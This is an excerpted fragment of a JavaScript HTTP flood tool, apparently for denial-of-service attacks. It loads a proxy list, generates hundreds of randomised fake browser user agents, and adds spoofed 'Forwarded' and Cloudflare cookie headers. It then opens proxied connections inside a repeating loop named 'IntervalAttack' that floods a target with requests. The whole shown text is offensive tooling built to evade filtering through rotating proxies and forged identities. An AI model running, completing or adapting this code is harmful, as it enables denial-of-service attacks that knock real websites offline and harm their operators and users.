...
const loadProxies = () => {
    if (args.proxyFile) {
      return readLines(args.proxyFile).filter(Boolean);
    }
    return [];
  };
...
function generateUserAgents(num) {
  const userAgents = [];
  ...
  const versions = {
    Firefox: ['78.0', '79.0', '80.0', '129.0.1', '128.1.0', '129.1', '129.0'],
    Chrome: ['83.0.4103.116', '84.0.4147.105', '85.0.4183.83', '127.0.6533.119', '127.0.6533.119', '127.0.6533.119', '127.0.6533.103', '128.0.6613.34',],
    Safari: ['13.1.1', '14.0.1', '14.0.3'],
    Edge: ['83.0.478.56', '84.0.522.63', '85.0.564.44', '127.0.2651.105', '127.2651.102', '127.0.2651.90'],
    Opera: ['68.0.3618.173', '69.0.3686.77', '70.0.3728.189', '112.0.5197.53', '76.2.4027.73374',]
  };

  for (let i = 0; i < num; i++) {
    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    const osString = os[Math.floor(Math.random() * os.length)];
    const version = versions[browser][Math.floor(Math.random() * versions[browser].length)];

    const userAgent = `Mozilla/5.0 (${osString}) AppleWebKit/537.36 (KHTML, like Gecko) ${browser}/${version}`;
...
const uap = generateUserAgents(800); //ganti sesuai jumlah contoh nya 5
...
{ "cookie": CookieCf },
{ "Expect": "100-continue" },
{ "Forwarded": "for=192.168.0.1;proto=http;by=" + spoofed2 },
//{ "From": "user@gmail.com" },
//{ "Max-Forwards": "10" },
...
let proxyIndex = 0;
var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];//random get useragents 
    ...
    Socker.HTTP(proxyOptions, (connection, error) => {
        ...
        client.on("connect", () => {
           const IntervalAttack = setInterval(() => {
                  const dynHeaders = {
                  ...headers,
                  ...rateHeaders5[Math.floor(Math.random()*rateHeaders.length)],
                  "user-agent": uap1,
                  ...rateHeaders4[Math.floor(Math.random()*rateHeaders.length)],
